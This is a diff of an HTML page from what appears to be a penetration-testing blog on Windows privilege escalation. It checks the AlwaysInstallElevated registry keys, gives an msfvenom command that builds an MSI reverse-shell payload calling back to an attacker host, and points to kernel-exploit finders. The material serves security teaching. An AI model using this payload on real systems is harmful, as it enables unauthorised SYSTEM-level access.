@@ -32,17 +32,16 @@
 </div>
 <div class="paragraph">
 	<p id="windows" class="subtitle">Windows:</p>
-<p class="content"><ul class="content"><li><span class="code">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="code">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br>If both are set to 1, the system installs MSI packages as nt authority/system. Generate a reverse shell using something like msfvenom to generate a payload: <span class="code">msfvenom -p windows/x64/shell/reverse_tcp -f msi LHOST=&lt;your ip&gt; LPORT=&lt;your port&gt; RHOST=&lt;target ip&gt; &gt; hack.msi</span>.</li></ul></p>
+<p class="content"><ul class="content"><li><span class="code">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="code">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br>If both are set to 1, the system installs MSI packages as nt authority/system. Generate a reverse shell using something like msfvenom to generate a payload: <span class="code">msfvenom -p windows/x64/shell/reverse_tcp -f msi LHOST=&lt;your ip&gt; LPORT=&lt;your port&gt; &gt; hack.msi</span>.</li><li>If on an older system (or try your luck on newer systems), check for kernel exploits with Sherlock <a href="/Blogs/resources.html#privesc_sherlock" class="link">[1]</a>. Watson supersedes Sherlock, but is a pain to compile (on linux) due to the requirement of Visual Studio.</li><li>If you can determine if the system is vulnerable to a kernel exploit, it will almost definitely be in SecWiki <a href="/Blogs/resources.html#privesc_secwiki" class="link">[2]</a>.</li></ul></p>
 </div>
 		<br>
 		<div class="paragraph">
 			<hr>
-			<p class="content">Last edit: 2021.08.29</p>
+			<p class="content">Last edit: 2021.09.04</p>
 		</div>
 	</div>
 </body>
 <footer>
 	<script type="text/javascript" src="/JS/blog.js"></script>
-	<script type="text/javascript" src="/JS/cookies.js"></script>
 </footer>
 </html>
